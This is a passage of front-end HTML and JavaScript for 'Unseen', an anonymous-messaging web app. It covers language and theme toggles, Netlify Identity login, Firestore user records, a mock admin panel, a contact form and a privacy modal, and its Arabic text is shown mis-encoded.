        logout: 'ØªØ³Ø¬ÙŠÙ„ Ø®Ø±ÙˆØ¬'
      },
      en:{
        heroTitle: 'Say it. Stay Unseen.',
        heroSub: 'Get anonymous messages from friends â€” fun, real, always private.',
        cta: 'Get Started',
        ctaLoggedIn: 'My Profile',
        contact:'Contact us',
        profileDefault:'unseen.app/u/yourname',
        copied: 'Link copied',
        copyFailed: 'Copy failed',
        messageSent: 'Message sent â€” thank you!',
        sendError: 'Send error: ',
        fillRequired: 'Please fill required fields',
        setupProfile: 'Now you can set up your profile and share the link.',
        adminPanel: 'Admin Panel',
        loading: 'Loading...',
        login: 'Login',
        logout: 'Logout'
      }
    };

    // Ø­ÙØ¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙÙŠ localStorage
    function saveSettings() {
      localStorage.setItem('language', currentLang);
      localStorage.setItem('theme', bodyEl.classList.contains('dark') ? 'dark' : 'light');
    }

    // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ù…Ù† localStorage
    function loadSettings() {
      const savedLang = localStorage.getItem('language');
      const savedTheme = localStorage.getItem('theme');
      
      if (savedLang) {
        currentLang = savedLang;
      }
      
      if (savedTheme === 'dark') {
        bodyEl.classList.add('dark');
        themeToggle.querySelector('span').textContent = 'light_mode'; // ØªØºÙŠÙŠØ± Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
      } else {
        themeToggle.querySelector('span').textContent = 'dark_mode';
      }
      
      applyLang();
    }

    let currentLang = 'ar';
    
    function applyLang(){
      document.documentElement.lang = currentLang;
      document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
      const t = texts[currentLang];
      document.getElementById('hero-title').innerText = t.heroTitle;
      document.getElementById('hero-subtext').innerText = t.heroSub;
      
      // ØªØ­Ø¯ÙŠØ« Ù†Øµ Ø²Ø± CTA Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
      updateCtaButton(netlifyIdentity.currentUser());
      
      // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¹Ù†Ø§ØµØ± Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­
      if (profileLinkText) {
        profileLinkText.textContent = t.profileDefault;
      }
      
      // ØªØ­Ø¯ÙŠØ« Ù†ØµÙˆØµ Ø§Ù„Ø£Ø²Ø±Ø§Ø±
      authBtn.setAttribute('title', currentLang === 'ar' ? 'ØªØ³Ø¬ÙŠÙ„/Ø­Ø³Ø§Ø¨' : 'Login/Account');
      signoutBtn.setAttribute('title', currentLang === 'ar' ? 'ØªØ³Ø¬ÙŠÙ„ Ø®Ø±ÙˆØ¬' : 'Logout');
      
      
      // Ø­ÙØ¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
      saveSettings();
    }
    
    // ØªØ­Ø¯ÙŠØ« Ù†Øµ Ø²Ø± CTA Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
    function updateCtaButton(user) {
      const ctaTextEl = document.getElementById('cta-text');
      if (user) {
        ctaTextEl.textContent = texts[currentLang].ctaLoggedIn;
      } else {
        ctaTextEl.textContent = texts[currentLang].cta;
      }
    }
    
    // Ø¥Ø¸Ù‡Ø§Ø± Ø¥Ø´Ø¹Ø§Ø± Toast
    function showToast(message, duration = 3000) {
      toastMessage.textContent = message;
      toast.classList.add('show');
      
      setTimeout(() => {
        toast.classList.remove('show');
      }, duration);
    }

    // Ø¥Ø¶Ø§ÙØ© event listeners Ù„Ù„ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
    langToggle.addEventListener('click',()=>{
      currentLang = currentLang === 'ar' ? 'en' : 'ar';
      applyLang();
    });

    themeToggle.addEventListener('click',()=>{ 
      bodyEl.classList.toggle('dark');
      // ØªØºÙŠÙŠØ± Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¶Ø¹ Ø§Ù„Ø­Ø§Ù„ÙŠ
      if (bodyEl.classList.contains('dark')) {
        themeToggle.querySelector('span').textContent = 'light_mode';
      } else {
        themeToggle.querySelector('span').textContent = 'dark_mode';
      }
      saveSettings();
    });

    // Mobile nav
    hamburger.addEventListener('click',()=>{ 
      mobileNav.style.display = mobileNav.style.display === 'block' ? 'none' : 'block'; 
    });

    // Contact modal
    let activeModal = null;
    let focusableElements = [];
    let firstFocusableElement = null;
    let lastFocusableElement = null;

    function openModal(modal){ 
      activeModal = modal;
      modal.classList.add('open'); 
      modal.setAttribute('aria-hidden','false');
      
      // Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„ØªØ±ÙƒÙŠØ² Ø¯Ø§Ø®Ù„ Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø©
      focusableElements = Array.from(modal.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'));
      if (focusableElements.length > 0) {
        firstFocusableElement = focusableElements[0];
        lastFocusableElement = focusableElements[focusableElements.length - 1];
        firstFocusableElement.focus();
      }
      
      // Ù…Ù†Ø¹ Ø§Ù„ØªÙ…Ø±ÙŠØ± Ø®Ù„Ù Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø©
      document.body.style.overflow = 'hidden';
      
      // Ø¥Ø¶Ø§ÙØ© event listener Ù„Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„ØªØ±ÙƒÙŠØ²
      modal.addEventListener('keydown', trapTabKey);
    }
    
    function closeModalFn(){ 
      if (activeModal) {
        activeModal.classList.remove('open'); 
        activeModal.setAttribute('aria-hidden','true');
        activeModal.removeEventListener('keydown', trapTabKey);
        activeModal = null;
      }
      
      // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙ…Ø±ÙŠØ±
      document.body.style.overflow = 'auto';
    }
    
    // ÙˆØ¸ÙŠÙØ© Ù„Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„ØªØ±ÙƒÙŠØ² Ø¯Ø§Ø®Ù„ Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø©
    function trapTabKey(e) {
      if (e.key !== 'Tab') return;
      
      if (e.shiftKey) {
        if (document.activeElement === firstFocusableElement) {
          e.preventDefault();
          lastFocusableElement.focus();
        }
      } else {
        if (document.activeElement === lastFocusableElement) {
          e.preventDefault();
          firstFocusableElement.focus();
        }
      }
    }

    openContact.addEventListener('click',() => openModal(contactModal));
    document.getElementById('contact-link').addEventListener('click',(e)=>{ 
      e.preventDefault(); 
      openModal(contactModal);
    });
    document.getElementById('contact-link-2').addEventListener('click',(e)=>{ 
      e.preventDefault(); 
      openModal(contactModal);
    });
    closeModal.addEventListener('click',closeModalFn);
    contactModal.addEventListener('click',(e)=>{ 
      if(e.target === contactModal) closeModalFn(); 
    });
    document.addEventListener('keydown',(e)=>{ 
      if(e.key==='Escape') closeModalFn(); 
    });

// Ø¯Ø§Ù„Ø© ensureUsername Ù„Ø¥Ù†Ø´Ø§Ø¡ Ø£Ùˆ Ø¬Ù„Ø¨ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
 async function ensureUsername(user) {
  try {
    const userDoc = await db.collection('users').doc(user.id).get();
    if (userDoc.exists) {
      return userDoc.data().username || user.id;
    } else {
      // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ø³ØªÙ†Ø¯ Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯ Ù…Ø¹ Ø§Ø³Ù… Ù…Ø³ØªØ®Ø¯Ù…
      const username = user.email ? user.email.split('@')[0] : 'user' + user.id.slice(0, 6);
      await db.collection('users').doc(user.id).set({
        uid: user.id,
        username: username,
        email: user.email || null,
        createdAt: firebase.firestore.FieldValue.serverTimestamp(),
        isAdmin: false
      });
      return username;
    }
  } catch (error) {
    console.error('Error ensuring username:', error);
    return user.id;
  }
}
    //Ø¯Ø§Ù„Ù‡ ensureUserDoc
    async function ensureUserDoc(user) {
  const docRef = db.collection('users').doc(user.id);
  const doc = await docRef.get();
  
  if(!doc.exists){
    // Ø§Ø³ØªØ®Ø¯Ù… ensureUsername Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ø³Ù… Ù…Ø³ØªØ®Ø¯Ù… Ù…ØªØ³Ù‚
    const username = await ensureUsername(user);
    await docRef.set({
      uid: user.id,
      username: username,
      email: user.email || null,
      createdAt: firebase.firestore.FieldValue.serverTimestamp(),
      isAdmin: false
        });
    console.log('âœ… Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯ ØªÙ… Ø¥Ù†Ø´Ø§Ø¤Ù‡');
  } else {
    // Ù…Ø³ØªØ®Ø¯Ù… Ù…ÙˆØ¬ÙˆØ¯ - ØªØ­Ø¯ÙŠØ« Ø¢Ø®Ø± Ø¯Ø®ÙˆÙ„ ÙÙ‚Ø·
    await docRef.update({
      lastLogin: firebase.firestore.FieldValue.serverTimestamp()
    });
    console.log('âœ… Ù…Ø³ØªØ®Ø¯Ù… Ù…ÙˆØ¬ÙˆØ¯ - ØªÙ… ØªØ­Ø¯ÙŠØ« Ø¢Ø®Ø± Ø¯Ø®ÙˆÙ„');
  }
}
    // Netlify Identity functions
    function initNetlifyIdentity() {
      // ØªÙ‡ÙŠØ¦Ø© Netlify Identity
      netlifyIdentity.init();
      
      // Ø¥Ø¶Ø§ÙØ© Ù…Ø³ØªÙ…Ø¹ÙŠ Ø§Ù„Ø£Ø­Ø¯Ø§Ø«
      netlifyIdentity.on('init', user => {
        updateAuthUI(user);
      });
      
      netlifyIdentity.on('login', user => {
        updateAuthUI(user);
        ensureUserDoc(user);
        updateProfileLink(user);
        showToast(currentLang === 'ar' ? 'ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­' : 'Logged in successfully');
      });

      
      netlifyIdentity.on('logout', () => {
        updateAuthUI(null);
        showToast(currentLang === 'ar' ? 'ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬' : 'Logged out');
        applyLang(); // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ù„Ù Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠ
      });
      
      netlifyIdentity.on('error', err => {
        console.error('Netlify Identity Error:', err);
        showToast(currentLang === 'ar' ? 'Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©' : 'Authentication error');
      });
    }
    
    function updateAuthUI(user) {
      if (user) {
        // Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø³Ø¬Ù„ Ø§Ù„Ø¯Ø®ÙˆÙ„
        authBtn.style.display = 'none';
        signoutBtn.style.display = 'inline-flex';
        
        // ØªØ­Ø¯ÙŠØ« Ù†Øµ Ø²Ø± CTA
        updateCtaButton(user);
        
        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù…Ø§ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø³Ø¤ÙˆÙ„Ø§Ù‹
        checkAdminStatus(user);
      } else {
        // Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ØºÙŠØ± Ù…Ø³Ø¬Ù„ Ø§Ù„Ø¯Ø®ÙˆÙ„
        authBtn.style.display = 'inline-flex';
        signoutBtn.style.display = 'none';
        adminBtn.style.display = 'none';
        
        // ØªØ­Ø¯ÙŠØ« Ù†Øµ Ø²Ø± CTA
        updateCtaButton(null);
      }
    }
    
    async function checkAdminStatus(user) {
      try {
        const userDoc = await db.collection('users').doc(user.id).get();
        if (userDoc.exists && userDoc.data().isAdmin) {
          adminBtn.style.display = 'inline-flex';
        } else {
          adminBtn.style.display = 'none';
        }
      } catch (error) {
        console.error('Error checking admin status:', error);
        adminBtn.style.display = 'none';
      }
    }
    
    // Admin panel functions
    adminBtn.addEventListener('click', () => {
      adminPanel.classList.add('open');
      loadAdminData();
    });
    
    closeAdminPanel.addEventListener('click', () => {
      adminPanel.classList.remove('open');
    });
    
    async function loadAdminData() {
      const user = netlifyIdentity.currentUser();
      if (!user) return;
      
      // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙƒÙ…Ø³Ø¤ÙˆÙ„
      try {
        const userDoc = await db.collection('users').doc(user.id).get();
        if (userDoc.exists && userDoc.data().isAdmin) {
          // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
          document.getElementById('reported-messages').innerHTML = '<li>' + texts[currentLang].loading + '</li>';
          document.getElementById('active-users').innerHTML = '<li>' + texts[currentLang].loading + '</li>';
          document.getElementById('system-stats').textContent = texts[currentLang].loading;
          
          // Ù…Ø­Ø§ÙƒØ§Ø© ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (ÙŠØ¬Ø¨ Ø§Ø³ØªØ¨Ø¯Ø§Ù„Ù‡Ø§ Ø¨Ø¨ÙŠØ§Ù†Ø§Øª Ø­Ù‚ÙŠÙ‚ÙŠØ©)
          setTimeout(() => {
            document.getElementById('reported-messages').innerHTML = `
              <li>
                <div>Ø±Ø³Ø§Ù„Ø© ØªØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ ÙƒÙ„Ù…Ø§Øª ØºÙŠØ± Ù„Ø§Ø¦Ù‚Ø©</div>
                <div class="admin-actions">
                  <button class="icon-btn"><span class="material-icons">delete</span></button>
                  <button class="icon-btn"><span class="material-icons">block</span></button>
                </div>
              </li>
            `;
            
            document.getElementById('active-users').innerHTML = `
              <li>
                <div>Ø£Ø­Ù…Ø¯ (user123)</div>
                <div class="muted">24 Ø±Ø³Ø§Ù„Ø©</div>
              </li>
              <li>
                <div>Ø³Ø§Ø±Ø© (sara2023)</div>
                <div class="muted">18 Ø±Ø³Ø§Ù„Ø©</div>
              </li>
            `;
            
            document.getElementById('system-stats').textContent = '542 Ù…Ø³ØªØ®Ø¯Ù… Ù†Ø´Ø· | 1248 Ø±Ø³Ø§Ù„Ø© Ø§Ù„ÙŠÙˆÙ…';
          }, 1000);
        }
      } catch (error) {
        console.error('Error loading admin data:', error);
      }
    }

    // Netlify Identity event handlers
    authBtn.addEventListener('click', () => {
      netlifyIdentity.open();
    });
    
    signoutBtn.addEventListener('click', () => {
      netlifyIdentity.logout();
    });

    
    async function ensureUserDoc(user) {
  const docRef = db.collection('users').doc(user.id);
  const doc = await docRef.get();
  
  if(!doc.exists){
    // Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯ - Ø£Ù†Ø´Ø¦ Ù…Ø³ØªÙ†Ø¯ Ù…Ø¹ isAdmin: false
    const derivedName = user.email ? user.email.split('@')[0].replace(/[^a-z0-9_-]/gi,'') : ('user'+user.id.slice(0,6));
    await docRef.set({
      uid: user.id,
      username: derivedName,
      email: user.email || null,
      createdAt: firebase.firestore.FieldValue.serverTimestamp(),
      isAdmin: false // Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ø¬Ø¯Ø¯ ÙÙ‚Ø·
    });
console.log('âœ… Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯ ØªÙ… Ø¥Ù†Ø´Ø§Ø¤Ù‡');
  } else {
    // Ù…Ø³ØªØ®Ø¯Ù… Ù…ÙˆØ¬ÙˆØ¯ - ØªØ­Ø¯ÙŠØ« Ø¢Ø®Ø± Ø¯Ø®ÙˆÙ„ ÙÙ‚Ø· Ø¯ÙˆÙ† Ø§Ù„Ù…Ø³Ø§Ø³ Ø¨Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø®Ø±Ù‰
    await docRef.update({
      lastLogin: firebase.firestore.FieldValue.serverTimestamp()
    });
    console.log('âœ… Ù…Ø³ØªØ®Ø¯Ù… Ù…ÙˆØ¬ÙˆØ¯ - ØªÙ… ØªØ­Ø¯ÙŠØ« Ø¢Ø®Ø± Ø¯Ø®ÙˆÙ„');
  }
}
    


    
    // Ø¯Ø§Ù„Ø© ÙˆØ§Ø­Ø¯Ø© Ù…Ø­Ø¯Ø«Ø© Ù„ØªØ­Ø¯ÙŠØ« Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ù„Ù Ø§Ù„Ø´Ø®ØµÙŠ
async function updateProfileLink(user) {
  try {
    const username = await ensureUsername(user);
  const profileUrl = `${window.location.origin}/SendMessage.html?u=${user.id}`;
    
    // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù†Øµ Ø§Ù„Ø¸Ø§Ù‡Ø±
    profileLinkText.textContent = `unseen.app/u/${username}`;
    profileLinkText.dataset.url = profileUrl;
    
        // Ø¥Ø¶Ø§ÙØ© Ø­Ø¯Ø« Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·
    copyBtn.onclick = async () => {
      try {
        await navigator.clipboard.writeText(profileUrl);
        showToast(currentLang === 'ar' ? 'ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·' : 'Link copied');
      } catch (err) {
        showToast(currentLang === 'ar' ? 'ÙØ´Ù„ Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·' : 'Failed to copy link');
      }
    };
        // ØªØ­Ø¯ÙŠØ« Ø²Ø± CTA Ù„Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù„Ù‰ ØµÙØ­Ø© Ø§Ù„Ø¨Ø±ÙˆÙØ§ÙŠÙ„
        ctaBtn.onclick = () => {
      const currentUser = netlifyIdentity.currentUser();
      if (!currentUser) {
        netlifyIdentity.open();
        return;
      }
      window.location.href = 'MyProfile.html';
    };
    
  } catch (error) {
    console.error('Error updating profile link:', error);
    showToast(currentLang === 'ar' ? 'Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø±Ø§Ø¨Ø·' : 'Error loading link');
  }
}
    // Copy profile link
    copyBtn.addEventListener('click', async ()=>{
      if (!profileLinkText) return;
      
      const text = profileLinkText.textContent.trim();
      try{
        await navigator.clipboard.writeText(text);
        showToast(texts[currentLang].copied);
      }catch(e){
        showToast(texts[currentLang].copyFailed);
      }
    });

    // Contact form saving to Firestore
    contactForm.addEventListener('submit', async (e)=>{
      e.preventDefault();
      const name = document.getElementById('name').value.trim();
      const email = document.getElementById('email').value.trim();
      const message = document.getElementById('message').value.trim();
      const user = netlifyIdentity.currentUser();
      try{
        await db.collection('contacts').add({
          name, email, message,
          senderUid: user ? user.id : null,
          createdAt: firebase.firestore.FieldValue.serverTimestamp()
        });
        showToast(texts[currentLang].messageSent);
        closeModalFn();
        contactForm.reset();
      }catch(err){
        showToast(texts[currentLang].sendError + err.message);
      }
    });

    // CTA button: Ù„Ùˆ ÙÙŠÙ‡ Ø­Ø³Ø§Ø¨ ÙŠÙˆØ¬Ù‡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù„Ø¥Ø¹Ø¯Ø§Ø¯ Ù…Ù„ÙÙ‡ Ø£Ùˆ Ø±Ø§Ø¨Ø· Ø§Ø³ØªÙ„Ø§Ù… Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
    ctaBtn.addEventListener('click', async ()=>{
      const user = netlifyIdentity.currentUser();
      if(!user){
        // Ù†Ø·Ù„Ø¨ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø£ÙˆÙ„Ù‹Ø§
        netlifyIdentity.open();
        return;
      }
      // ØªÙˆØ¬ÙŠÙ‡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¥Ù„Ù‰ ØµÙØ­Ø© MyProfile.html
      window.location.href = 'MyProfile.html';
    });

    // STATS: Ø­Ø³Ø§Ø¨ Ø¨Ø³ÙŠØ· Ø¹Ø¨Ø± Ù‚Ø±Ø§Ø¡Ø© Ù…Ø¬Ù…ÙˆØ¹ Ø§Ù„Ù…Ø³ØªÙ†Ø¯Ø§Øª (Ù…Ù†Ø§Ø³Ø¨ Ù„Ù„Ù…Ø´Ø§Ø±ÙŠØ¹ Ø§Ù„ØµØºÙŠØ±Ø©)
    async function fetchAndRenderStats(){
      try{
        // users count
        const usersSnap = await db.collection('users').get();
        const usersCount = usersSnap.size || 0;
        document.getElementById('stat-users').textContent = usersCount.toLocaleString();

        // messages count (collection "messages" â€” ÙŠØ¹ØªÙ…Ø¯ Ø¥Ù†Ùƒ ØªØ³Ø¬Ù‘Ù„ Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù‡Ù†Ø§Ùƒ)
        const messagesSnap = await db.collection('messages').get();
        const messagesCount = messagesSnap.size || 0;
        document.getElementById('stat-messages').textContent = messagesCount.toLocaleString();

        // ratings average (collection "ratings" Ù…Ø¹ Ø­Ù‚Ù„ value)
        const ratingsSnap = await db.collection('ratings').get();
        if(!ratingsSnap.empty){
          let sum = 0; let cnt = 0;
          ratingsSnap.forEach(d => { sum += (d.data().value || 0); cnt++; });
          const avg = (cnt>0) ? (sum / cnt) : 0;
          document.getElementById('stat-rating').textContent = avg.toFixed(1) + 'â˜…';
        } else {
          // Ù‚ÙŠÙ…Ø© Ø§ÙØªØ±Ø§Ø¶ÙŠØ© Ø¥Ø°Ø§ Ù„Ø§ ØªÙˆØ¬Ø¯ ØªÙ‚ÙŠÙŠÙ…Ø§Øª
          document.getElementById('stat-rating').textContent = '4.8â˜…';
        }
      }catch(e){
        console.error('Stats error', e);
      }
    }

    // small animation: stat counters (static numbers fallback)
    function animateNumber(id, end){ const el = document.getElementById(id); let cur = 0; const step = Math.ceil(Math.max(1,end)/40); const iv = setInterval(()=>{ cur += step; if(cur>=end){ el.textContent = end; clearInterval(iv); } else el.textContent = cur.toLocaleString(); },20); }
    // fallback initial animations (these will be replaced by fetchAndRenderStats when ready)
    animateNumber('stat-messages',1248); animateNumber('stat-users',5432);

    // simple testimonials slider
    const testList = document.getElementById('test-list');
    let tIndex=0;
    function showTest(i){ testList.style.transform = `translateX(-${i*100}%)`; }
    setInterval(()=>{ tIndex = (tIndex+1) % testList.children.length; showTest(tIndex); },3500);

    // Back to top visibility
    const backToTop = document.getElementById('back-to-top');
    window.addEventListener('scroll',()=>{
      if(window.scrollY > 300) backToTop.classList.add('show'); else backToTop.classList.remove('show');
    });
    backToTop.addEventListener('click',()=> window.scrollTo({top:0,behavior:'smooth'}));

    // ØªØ­Ø¯ÙŠØ« ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¨Ø¹Ø¯ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
    netlifyIdentity.on('login', async (user) => {
      updateAuthUI(user);
      await ensureUserDoc(user);
      await updateProfileLink(user);
      showToast(currentLang === 'ar' ? 'ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­' : 'Logged in successfully');
    });
      

    // Init
    loadSettings();
    initNetlifyIdentity();
    
    // Fetch stats initially and every minute
    fetchAndRenderStats();
    setInterval(fetchAndRenderStats, 60_000);
  </script>
  <script type="module" src="./firebase-init.js"></script>
  <script>
  window.addEventListener('DOMContentLoaded', () => {
    // Ù„Ùˆ Ø§Ù„Ù„ÙŠÙ†Ùƒ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ recovery_token
    if (window.location.hash.includes('recovery_token')) {
      // Ø§Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù€ widget Ø§Ù„Ø­Ø§Ù„ÙŠ Ø¨Ø¯Ù„ Ù…Ø§ ØªØ¹Ù…Ù„ init Ø¬Ø¯ÙŠØ¯Ø©
      const checkReady = setInterval(() => {
        if (window.netlifyIdentity) {
          clearInterval(checkReady);
          netlifyIdentity.open('recovery');
        }
      }, 500);
    }
  });
  </script>


<!-- Ø³ÙŠØ§Ø³Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ© ÙˆØ§Ù„Ø´Ø±ÙˆØ· -->
<div class="modal" id="privacy-modal" aria-hidden="false" style="display: grid;">
  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="privacy-title" style="max-width: 500px; max-height: 80vh; overflow-y: auto;">
    <div style="text-align: center; margin-bottom: 20px;">
      <span class="material-icons" style="font-size: 48px; color: var(--primary); margin-bottom: 10px;">privacy_tip</span>
      <h3 id="privacy-title" style="margin: 0 0 8px 0;">Ù…Ø±Ø­Ø¨Ù‹Ø§ Ø¨Ùƒ ÙÙŠ Unseen</h3>
      <p class="muted" style="margin: 0;">Ù†Ø­Ù† Ù†Ø­Ø±Øµ Ø¹Ù„Ù‰ Ø®ØµÙˆØµÙŠØªÙƒ ÙˆØ£Ù…Ø§Ù†Ùƒ</p>
    </div>
        <div style="margin-bottom: 20px;">
      <div class="card" style="margin-bottom: 12px; background: rgba(90, 63, 255, 0.05);">
        <div style="display: flex; align-items: flex-start; gap: 10px;">
          <span class="material-icons" style="color: var(--accent); font-size: 20px;">visibility_off</span>
          <div>
            <strong style="display: block; margin-bottom: 4px;">Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ù…Ø¬Ù‡ÙˆÙ„Ø© Ø§Ù„Ù‡ÙˆÙŠØ©</strong>
            <p class="muted" style="margin: 0; font-size: 0.9rem;">Ù†Ø­Ù† Ù„Ø§ Ù†ÙƒØ´Ù Ù‡ÙˆÙŠØ© Ø§Ù„Ù…Ø±Ø³Ù„ÙŠÙ†ØŒ ÙˆØ¨ÙŠØ§Ù†Ø§ØªÙƒ Ù…Ø­Ù…ÙŠØ© Ø¨Ø´ÙƒÙ„ Ø¢Ù…Ù†.</p>
          </div>
        </div>
      </div>
       <div class="card" style="margin-bottom: 12px; background: rgba(6, 182, 212, 0.05);">
        <div style="display: flex; align-items: flex-start; gap: 10px;">
          <span class="material-icons" style="color: var(--primary); font-size: 20px;">gpp_good</span>
          <div>
            <strong style="display: block; margin-bottom: 4px;">Ø®ØµÙˆØµÙŠØ© ØªØ§Ù…Ø©</strong>
            <p class="muted" style="margin: 0; font-size: 0.9rem;">Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ø§Ù„Ø´Ø®ØµÙŠØ© ÙÙŠ Ø£Ù…Ø§Ù† ÙˆÙ„Ø§ Ù†Ø´Ø§Ø±ÙƒÙ‡Ø§ Ù…Ø¹ Ø£ÙŠ Ø·Ø±Ù Ø«Ø§Ù„Ø«.</p>
          </div>
        </div>
      </div>
               <div class="card" style="margin-bottom: 12px; background: rgba(239, 68, 68, 0.05);">
        <div style="display: flex; align-items: flex-start; gap: 10px;">
          <span class="material-icons" style="color: #ef4444; font-size: 20px;">block</span>
          <div>
            <strong style="display: block; margin-bottom: 4px;">Ù…Ù…Ù†ÙˆØ¹ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ù…Ø³ÙŠØ¡</strong>
            <p class="muted" style="margin: 0; font-size: 0.9rem;">ÙŠÙ…Ù†Ø¹ Ø¥Ø±Ø³Ø§Ù„ Ø£ÙŠ Ù…Ø­ØªÙˆÙ‰ Ø¨Ù‡ Ø¥ÙŠØ­Ø§Ø¡Ø§Øª Ø£Ùˆ Ø£Ù„ÙØ§Ø¸ Ø®Ø§Ø¯Ø´Ø© Ù„Ù„Ø­ÙŠØ§Ø¡.</p>
          </div>
        </div>
      </div>
    </div> 
    <div style="background: var(--card); padding: 15px; border-radius: 10px; margin-bottom: 20px;">
      <h4 style="margin: 0 0 10px 0; font-size: 1rem;">Ø´Ø±ÙˆØ· Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…:</h4>
      <ul class="muted" style="margin: 0; padding-right: 15px; font-size: 0.9rem; line-height: 1.5;">
        <li>Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù…Ø±Ø³Ù„Ø© ØªÙƒÙˆÙ† Ù…Ø¬Ù‡ÙˆÙ„Ø© Ø§Ù„Ù…ØµØ¯Ø±</li>
        <li>ÙŠÙ…Ù†Ø¹ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…Ù†ØµØ© Ù„Ù„Ø¥Ø³Ø§Ø¡Ø© Ø£Ùˆ Ø§Ù„Ù…Ø¶Ø§ÙŠÙ‚Ø©</li>
        <li>ÙŠØ­Ù‚ Ù„Ù„Ø¥Ø¯Ø§Ø±Ø© Ø­Ø¸Ø± Ø£ÙŠ Ù…Ø³ØªØ®Ø¯Ù… ÙŠØ®Ø§Ù„Ù Ø§Ù„Ø´Ø±ÙˆØ·</li>
